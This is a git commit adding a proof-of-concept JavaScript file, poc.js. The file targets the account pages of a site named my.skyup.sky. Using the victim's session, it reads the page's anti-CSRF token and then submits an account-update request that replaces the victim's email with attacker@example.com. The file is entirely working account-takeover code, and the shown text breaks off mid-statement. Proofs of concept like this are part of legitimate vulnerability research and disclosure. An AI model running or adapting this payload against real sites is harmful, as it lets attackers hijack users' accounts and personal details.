a9b8750d4cf0b47cf142800f5aee0795b5920fb0
Scho5678 <88236467+Scho5678@users.noreply.github.com>
2026-02-05 09:12:23 +0000

    Add files via upload

---
+++ poc.js
@@ -0,0 +1,26 @@
+// Get CSRF token
+fetch('my.skyup.sky/Account/MyAccount', {
+  credentials: 'include'
+}).then(r => r.text()).then(html => {
+  // Extract token
+  var parser = new DOMParser();
+  var doc = parser.parseFromString(html, 'text/html');
+  var token = doc.querySelector('input[name="__RequestVerificationToken"]').value;
+  // Change email
+  var formData = new FormData();
+  formData.append('__RequestVerificationToken', token);
+  formData.append('Title', 'Mr');
+  formData.append('FirstName', 'attacker');
+  formData.append('LastName', 'Change');
+  formData.append('Telephone', '9999999999');
+  formData.append('EmailAddress', 'attacker@example.com');
+  formData.append('ConfirmEmailAddress', 'attacker@example.com');
+  formData.append('MainPosition', 'Headteacher');
+  formData.append('CurrentSchool', 'Abbey College');
+  formData.append('PostcodeLookupInput', '');
+  return fetch('my.skyup.sky/Handlers/UpdateDetails', {
+    method: 'POST',
+    credentials: 'include',
+    body: formData
+  });
+}).then(r => r.text()).then(result
